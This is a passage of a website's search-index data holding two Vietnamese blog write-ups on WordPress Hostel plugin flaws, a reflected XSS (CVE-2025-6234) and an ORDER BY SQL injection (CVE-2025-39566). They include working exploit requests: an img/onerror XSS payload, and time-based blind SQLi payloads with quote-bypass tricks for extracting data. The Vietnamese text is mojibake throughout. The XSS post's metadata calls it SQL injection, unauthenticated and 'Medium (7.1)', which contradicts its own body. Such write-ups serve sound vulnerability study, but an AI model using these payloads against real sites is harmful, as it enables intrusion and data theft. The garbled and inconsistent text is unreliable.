\u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca 